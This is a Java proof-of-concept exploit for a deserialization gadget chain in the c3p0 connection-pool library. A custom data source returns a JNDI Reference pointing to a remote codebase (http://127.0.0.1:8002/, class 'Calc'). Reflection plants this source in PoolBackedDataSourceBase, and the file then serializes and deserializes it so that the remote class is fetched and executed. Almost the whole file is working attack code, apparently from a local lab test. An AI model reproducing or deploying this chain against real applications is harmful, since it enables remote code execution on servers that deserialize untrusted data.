package C3P0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class C3P01 {

    public static class C3P0 implements ConnectionPoolDataSource, Referenceable {

        @Override
        public Reference getReference() throws NamingException {
            return new Reference("Calc", "Calc", "http://127.0.0.1:8002/");
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }


    public static void unserialize(byte[] bytes) throws Exception {
        try (ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
             ObjectInputStream oin = new ObjectInputStream(bain)) {
            oin.readObject();
        }
    }

    public static byte[] serialize(ConnectionPoolDataSource lp) throws Exception {
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Field connectionPoolDataSourceField = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        connectionPoolDataSourceField.setAccessible(true);
        connectionPoolDataSourceField.set(poolBackedDataSourceBase, lp);


        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();
             ObjectOutputStream oout = new ObjectOutputStream(baout)) {
            oout.writeObject(poolBackedDataSourceBase);
            return baout.toByteArray();
        }

    }

    public static void main(String[] args) throws Exception {
        C3P0 exp = new C3P0();
        byte[] bytes = serialize(exp);
        unserialize(bytes);
    }

}